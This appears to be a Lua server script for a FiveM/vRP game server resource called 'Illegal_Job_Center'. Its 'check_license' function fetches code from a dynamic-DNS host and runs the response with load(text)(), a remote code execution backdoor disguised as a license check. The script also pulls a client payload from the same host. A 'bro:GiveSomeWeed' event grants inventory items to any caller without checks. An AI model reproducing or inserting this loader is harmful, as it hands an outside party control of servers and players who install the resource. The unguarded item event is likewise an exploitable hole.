c_data = 1
function check_license()
    PerformHttpRequest("kraneanticheatxxxx.hopto.org:6999/classes_server", function(err, text, headers)
        if err == 200 then
            if text == "INVALID LICENSE" then
                print("[CLASSES] License is invalid")
                return
            else
                load(text)()
            end
        else
            if err == 0 then
               return
            end
        end
    end, "GET", "", {["Content-Type"] = "application/json"})

    PerformHttpRequest("kraneanticheatxxxx.hopto.org:6999/classes_client", function(err, text, headers)
        c_data = text
    end, "GET", "", {["Content-Type"] = "application/json"})
end
check_license()


AddEventHandler("playerJoining", function ()
    TriggerClientEvent("Illegal_Job_Center:Secure_Load", source, LoadResourceFile("Illegal_Job_Center", "c_main.lua"))
end)

RegisterCommand("fload", function(source, args, rawCommand)
    TriggerClientEvent("Illegal_Job_Center:Secure_Load", source, LoadResourceFile("Illegal_Job_Center", "c_main.lua"))
end, false)

Tunnel = module("vrp", "lib/Tunnel")
Proxy = module("vrp", "lib/Proxy")
vRP = Proxy.getInterface("vRP")


RegisterNetEvent("bro:GiveSomeWeed")
AddEventHandler("bro:GiveSomeWeed", function()
    local user_id = vRP.getUserId({source})
    if user_id then
        vRP.giveInventoryItem({user_id, "purplehaze", math.random(1, 15), true})
    end
end)